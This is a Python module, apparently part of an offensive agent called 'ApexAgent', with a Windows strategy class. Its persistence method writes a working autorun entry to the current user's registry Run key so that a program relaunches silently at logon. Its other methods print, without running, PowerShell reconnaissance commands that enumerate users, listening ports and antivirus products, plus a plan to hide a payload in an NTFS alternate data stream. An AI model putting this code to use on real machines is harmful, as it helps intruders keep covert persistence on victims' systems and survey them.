import os
import sys
import subprocess
import shutil
from rich.console import Console

console = Console()

class WindowsStrategy:
    """
    Operations for Windows Environments.
    Focused on Registry persistence and PowerShell reconnaissance.
    """
    def install_persistence(self):
        console.print("[WINDOWS] 💾 Installing Registry Persistence...")

        try:
            import winreg

            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "ApexAgent"
            exe_path = sys.executable  # In a real scenario, this would be the payload path

            # Using HKCU to avoid requiring admin privileges
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{exe_path}" --silent')

            console.print(f"[WINDOWS] ✅ Persistence installed at HKCU\\{key_path}\\{app_name}")

        except ImportError:
            console.print("[WINDOWS] ⚠️  Not running on Windows or winreg module missing.")
        except Exception as e:
            console.print(f"[WINDOWS] ❌ Persistence Failed: {e}")

    def perform_recon(self):
        console.print("[WINDOWS] 📡 Running PowerShell Reconnaissance...")

        commands = [
            ("System Info", "systeminfo | findstr /B /C:'OS Name' /C:'OS Version'"),
            ("Network Connections", "Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}"),
            ("Users", "net user"),
            ("Running Processes", "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"),
            ("Antivirus Status", "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct")
        ]

        for desc, cmd in commands:
            console.print(f"  > Executing PowerShell: {cmd}")
            # subprocess.run(["powershell", "-Command", cmd], capture_output=True)

    def engage_stealth(self):
        console.print("[WINDOWS] 👻 Engaging ADS (Alternate Data Streams)...")

        target_file = "calc.exe"  # Hypothetical target
        hidden_stream = "updates.log"
        payload = "apex_config.json"

        console.print(f"  > Hiding {payload} inside {target_file}:{hidden_stream}")
        # Command: type payload > target_file:hidden_stream
